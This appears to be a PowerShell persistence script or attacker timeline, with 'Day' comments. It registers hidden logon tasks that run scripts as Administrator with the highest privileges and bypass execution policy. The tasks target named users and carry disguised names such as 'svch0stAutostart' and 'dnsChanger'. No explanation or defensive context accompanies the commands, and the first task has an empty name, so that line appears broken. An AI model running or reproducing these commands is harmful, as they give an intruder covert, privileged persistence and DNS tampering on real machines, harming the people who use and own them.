Register-ScheduledTask -TaskName "" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Program Files\dns.ps1"') -Trigger (New-ScheduledTaskTrigger -AtLogOn -User "a.mueller") -User "Administrator" -RunLevel Highest -Force

# Day 2-3
Register-ScheduledTask -TaskName "svch0stAutostart" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c "C:\Program Files\chrome.cmd"') -Trigger (New-ScheduledTaskTrigger -AtLogOn -User "d.zimmermann") -User "Administrator" -RunLevel Highest -Force

# Day 4
Register-ScheduledTask -TaskName "dnsChanger" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Users\Administrator\dns.ps1"') -Trigger (New-ScheduledTaskTrigger -AtLogOn -User "a.mueller") -Settings (New-ScheduledTaskSettingsSet -RunOnlyOnce) -User "Administrator" -RunLevel Highest -Force
